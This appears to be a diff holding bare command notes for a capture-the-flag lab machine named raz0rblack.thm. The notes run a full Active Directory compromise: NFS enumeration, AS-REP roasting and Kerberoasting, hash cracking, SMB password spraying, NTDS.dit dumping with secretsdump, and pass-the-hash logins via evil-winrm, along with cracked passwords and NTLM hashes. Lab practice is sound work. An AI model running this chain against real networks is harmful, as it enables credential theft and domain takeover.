@@ -1,0 +1,47 @@
+nmap -A -T4 -V IP
+nmap -n -sV — script “ldap* and not brute” -p 389 $IP
+#2049/TCP open NFS)
+showmount -e 10.10.25.33
+Export list for 10.10.25.33:
+/users (everyone)
+mount 10.10.25.33:/users /mnt/users
+#employee_status.xlsx and sbradley.txt.
+python3 GetNPUsers.py -no-pass raz0rblack.thm/ -usersfile users.txt -format hashcat -outputfile hashes.txt
+
+hashcat -m 18200 hashes.txt rockyou.txt
+
+smbmap -H $IP -u twilliams -p roastpotatoes
+
+crackmapexec smb $IP -u users.txt -p pass.txt
+
+smbpasswd -r $IP -U sbradley
+
+smbmap -H $IP -u sbradley -p 'testing'
+
+zip2john experiment_gone_wrong.zip > hash2.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt hash2.txt
+unzip experiment_gone_wrong.zip
+
+python3 /opt/impacket/examples/secretsdump.py -system system.hive         -ntds ntds.dit LOCAL > hashes3.txt
+
+crackmapexec smb $IP -u lvetrova -H hashes3.txt
+
+evil-winrm -i $IP -u lvetrova -H f220d3988deb3f516c73f40ee16c431d 
+
+
+PS C:\Users\lvetrova> $Credential = Import-Clixml -Path "lvetrova.xml"
+PS C:\Users\lvetrova> $Credential.GetNetworkCredential().password
+
+python3 /opt/impacket/examples/GetUserSPNs.py raz0rblack.thm/lvetrova -hashes f220d3988deb3f516c73f40ee16c431d:f220d3988deb3f516c73f40ee16c431d -outputfile hashes4.txt
+
+hashcat -m 13100 hashes4.txt rockyou.txt
+
+evil-winrm -i $IP -u xyan1d3 -p cyanide9amine5628
+
+PS C:\Users\xyan1d3> $Credential = Import-Clixml -Path "xyan1d3.xml"
+PS C:\Users\xyan1d3> $Credential.GetNetworkCredential().password
+
+python3 /opt/impacket/examples/secretsdump.py -system system -ntds ntds.dit LOCAL
+
+evil-winrm -i $IP -u administrator -H 9689931bed40ca5a2ce1218210177f0c
+
